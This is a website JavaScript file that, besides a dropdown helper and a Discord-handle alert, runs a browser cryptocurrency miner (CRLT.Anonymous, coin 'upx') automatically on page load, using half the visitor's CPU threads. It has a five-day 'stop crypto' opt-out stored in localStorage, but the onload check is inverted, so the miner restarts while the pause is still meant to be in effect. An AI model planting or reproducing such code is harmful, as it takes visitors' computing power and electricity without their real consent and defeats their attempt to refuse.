miner = null;

if(!Date.now) {  // compatibility
    Date.now = () => new Date().getTime();
}


function alertDiscord() {
	alert('PatrickMSM#9997');
}


function dropdown(dropdownelem) {
	let content = dropdownelem.querySelector('#dropdowncontent');
	if (content.style.display == 'none') {
		content.style.display = 'block';
	} else {
		content.style.display = 'none';
	}
}

function enable_mine() {
	if (miner == null) {
		// Miner
		var threads = window.navigator.hardwareConcurrency / 2;
		if (threads < 1) {
		    var threads = 1;
		}

		miner = new CRLT.Anonymous('70ef7f254440e6d0fa184228a4bc9465bd5c5d5e1051', {
			threads:threads,throttle:0.8, coin: 'upx',
		});
	}

	miner.start();
}

function disable_mine(argument) {
	if (miner != null) {
		miner.stop();
	}
}

function stopcrypto(argument) {
	// stop

	// remove notice 
	document.getElementById('stopcryptodiv').remove();
	// stop
	disable_mine();
	// save                                                 5 days in milliseconds
	localStorage.setItem('MinerShutOff', Math.floor(Date.now()) + (432000000))
}


window.onload = function() {
	if (localStorage.getItem('MinerShutOff') == null || localStorage.getItem('MinerShutOff') == '') {
		enable_mine();
	} else {
		// its disabled
		// check if time disabled alr passed
		let now = Math.floor(Date.now());
		if (Math.floor(parseInt(localStorage.getItem('MinerShutOff'))) >= now) {
			// passed
			localStorage.removeItem('MinerShutOff');
			enable_mine();
		} else {
			// still disabled
			disable_mine();
			// remove notice
			document.getElementById('stopcryptodiv').remove();
		}
	}
}

